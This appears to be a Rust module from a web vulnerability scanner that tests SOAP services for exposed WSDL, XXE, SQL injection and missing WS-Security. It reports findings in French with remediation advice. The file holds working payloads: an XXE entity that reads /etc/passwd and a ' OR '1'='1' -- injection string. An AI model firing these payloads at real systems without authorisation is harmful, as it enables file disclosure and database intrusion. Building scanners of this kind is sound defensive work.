use async_trait::async_trait;
use nevelio_core::types::{Endpoint, Finding, Severity};
use nevelio_core::{AttackModule, HttpClient, ScanSession};

pub struct SoapModule;

const WSDL_SUFFIXES: &[&str] = &["?wsdl", "?WSDL", ".wsdl", "/wsdl", "?singleWsdl"];

const XXE_PAYLOAD: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><nevelio_test>&xxe;</nevelio_test></soapenv:Body>
</soapenv:Envelope>"#;

const SQLI_PAYLOAD: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <nevelio_test>
      <user>' OR '1'='1' --</user>
      <pass>nevelio</pass>
    </nevelio_test>
  </soapenv:Body>
</soapenv:Envelope>"#;

const ANONYMOUS_ENVELOPE: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><ping/></soapenv:Body>
</soapenv:Envelope>"#;

#[async_trait]
impl AttackModule for SoapModule {
    fn name(&self) -> &str {
        "soap"
    }

    fn description(&self) -> &str {
        "SOAP/WSDL : divulgation WSDL, XXE, injection dans les paramètres, absence de WS-Security"
    }

    async fn run(
        &self,
        session: &ScanSession,
        client: &HttpClient,
        endpoints: &[Endpoint],
    ) -> Vec<Finding> {
        let mut findings = Vec::new();
        let base = session.config.target.trim_end_matches('/');

        // 1. WSDL disclosure at target root
        for suffix in WSDL_SUFFIXES {
            let url = format!("{}{}", base, suffix);
            if let Some(f) = check_wsdl_disclosure(client, &url).await {
                findings.push(f);
                break;
            }
        }

        // 2. Check endpoints that look like SOAP services
        for ep in endpoints {
            if !looks_like_soap(&ep.path) {
                continue;
            }

            // WSDL disclosure per endpoint
            let wsdl_url = format!("{}?wsdl", ep.full_url.trim_end_matches('/'));
            if let Some(f) = check_wsdl_disclosure(client, &wsdl_url).await {
                findings.push(f);
            }

            // XXE injection
            if let Some(f) = check_soap_xxe(client, &ep.full_url).await {
                findings.push(f);
            }

            // SQL injection
            if let Some(f) = check_soap_sqli(client, &ep.full_url).await {
                findings.push(f);
            }

            // Missing WS-Security
            if let Some(f) = check_soap_auth(client, &ep.full_url).await {
                findings.push(f);
            }
        }

        findings
    }
}

fn looks_like_soap(path: &str) -> bool {
    let p = path.to_lowercase();
    p.ends_with(".asmx")
        || p.ends_with(".svc")
        || p.ends_with(".wsdl")
        || p.contains("soap")
        || p.contains("service")
        || p.contains("wsdl")
        || p.contains("rpc")
}

// ── Checks ────────────────────────────────────────────────────────────────────

async fn check_wsdl_disclosure(client: &HttpClient, url: &str) -> Option<Finding> {
    let req = client.inner().get(url).build().ok()?;
    let resp = client.send(req).await.ok()?;
    if !resp.status().is_success() {
        return None;
    }
    let body = resp.text().await.ok()?;

    let is_wsdl = body.contains("wsdl:definitions")
        || body.contains("definitions xmlns")
        || body.contains("<types>")
        || body.contains("xs:schema")
        || body.contains("portType");

    if !is_wsdl {
        return None;
    }

    // Count exposed operations using quick-xml
    let ops = count_wsdl_operations(&body);

    let mut f = Finding::new(
        "SOAP — WSDL exposé publiquement",
        Severity::Medium,
        5.3,
        "soap",
        url,
        "GET",
    );
    f.description = format!(
        "Le fichier WSDL est accessible sans authentification ({} opération(s) exposée(s)). \
         Il révèle la structure complète du service SOAP, les types de données et les méthodes disponibles.",
        ops
    );
    f.recommendation =
        "Restreindre l'accès au WSDL avec une authentification. Supprimer les opérations \
         non nécessaires. Utiliser des noms d'opérations non prédictibles."
            .to_string();
    f.cwe = Some("CWE-200".to_string());
    f.references = vec![
        "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection".to_string(),
    ];
    Some(f)
}

fn count_wsdl_operations(wsdl: &str) -> usize {
    wsdl.matches("<operation").count() + wsdl.matches("<wsdl:operation").count()
}

async fn check_soap_xxe(client: &HttpClient, url: &str) -> Option<Finding> {
    let req = client
        .inner()
        .post(url)
        .header("Content-Type", "text/xml; charset=utf-8")
        .header("SOAPAction", "\"\"")
        .body(XXE_PAYLOAD)
        .build()
        .ok()?;

    let resp = client.send(req).await.ok()?;
    let body = resp.text().await.ok()?;

    let xxe_indicators = ["root:", "/bin/bash", "nobody:", "daemon:", "/etc/passwd"];
    if !xxe_indicators.iter().any(|i| body.contains(i)) {
        return None;
    }

    let mut f = Finding::new(
        "SOAP — XXE (XML External Entity Injection)",
        Severity::Critical,
        9.8,
        "soap",
        url,
        "POST",
    );
    f.description =
        "L'endpoint SOAP est vulnérable aux injections XXE. Un attaquant peut lire des fichiers \
         arbitraires sur le serveur (ex. /etc/passwd) ou déclencher des SSRF."
            .to_string();
    f.proof = body.chars().take(300).collect();
    f.recommendation =
        "Désactiver le traitement des entités XML externes dans le parser XML. \
         Utiliser des parsers configurés avec FEATURE_SECURE_PROCESSING. \
         Valider et filtrer toutes les entrées XML."
            .to_string();
    f.cwe = Some("CWE-611".to_string());
    f.references = vec![
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing".to_string(),
        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html".to_string(),
    ];
    Some(f)
}

async fn check_soap_sqli(client: &HttpClient, url: &str) -> Option<Finding> {
    let req = client
        .inner()
        .post(url)
        .header("Content-Type", "text/xml; charset=utf-8")
        .header("SOAPAction", "\"\"")
        .body(SQLI_PAYLOAD)
        .build()
        .ok()?;

    let resp = client.send(req).await.ok()?;
    let body = resp.text().await.ok()?;

    let sql_errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "pg_query",
        "SQLSTATE",
        "Unclosed quotation",
        "syntax error",
        "column does not exist",
        "near \"OR\"",
    ];

    if !sql_errors.iter().any(|e| body.to_lowercase().contains(&e.to_lowercase())) {
        return None;
    }

    let mut f = Finding::new(
        "SOAP — Injection SQL dans les paramètres",
        Severity::Critical,
        9.1,
        "soap",
        url,
        "POST",
    );
    f.description =
        "L'endpoint SOAP retourne des messages d'erreur SQL indiquant une injection possible \
         dans les paramètres du body SOAP."
            .to_string();
    f.proof = body.chars().take(300).collect();
    f.recommendation =
        "Utiliser des requêtes paramétrées (PreparedStatement). Ne jamais interpoler \
         directement des valeurs XML dans des requêtes SQL."
            .to_string();
    f.cwe = Some("CWE-89".to_string());
    Some(f)
}

async fn check_soap_auth(client: &HttpClient, url: &str) -> Option<Finding> {
    let req = client
        .inner()
        .post(url)
        .header("Content-Type", "text/xml; charset=utf-8")
        .header("SOAPAction", "\"ping\"")
        .body(ANONYMOUS_ENVELOPE)
        .build()
        .ok()?;

    let resp = client.send(req).await.ok()?;
    if !resp.status().is_success() {
        return None;
    }
    let body = resp.text().await.ok()?;

    // Only flag if the server returns a non-error SOAP response
    if !body.contains("<soapenv:Body>") && !body.contains("<Body>") && !body.contains("<soap:Body>") {
        return None;
    }

    let mut f = Finding::new(
        "SOAP — Service accessible sans WS-Security",
        Severity::High,
        7.5,
        "soap",
        url,
        "POST",
    );
    f.description =
        "L'endpoint SOAP retourne une réponse valide à une requête anonyme sans header \
         WS-Security (UsernameToken, SAML ou certificat X.509)."
            .to_string();
    f.recommendation =
        "Implémenter WS-Security avec UsernameToken (digest password) ou SAML assertions. \
         Exiger l'authentification sur toutes les opérations SOAP exposées."
            .to_string();
    f.cwe = Some("CWE-306".to_string());
    Some(f)
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_soap_paths() {
        assert!(looks_like_soap("/api/UserService.asmx"));
        assert!(looks_like_soap("/ws/PaymentService.svc"));
        assert!(looks_like_soap("/soap/v1"));
        assert!(looks_like_soap("/api/rpc/user"));
        assert!(!looks_like_soap("/api/users"));
        assert!(!looks_like_soap("/health"));
    }

    #[test]
    fn counts_wsdl_operations() {
        let wsdl = r#"<operation name="GetUser"/><operation name="CreateUser"/>"#;
        assert_eq!(count_wsdl_operations(wsdl), 2);
    }

    #[test]
    fn module_name() {
        assert_eq!(SoapModule.name(), "soap");
    }
}
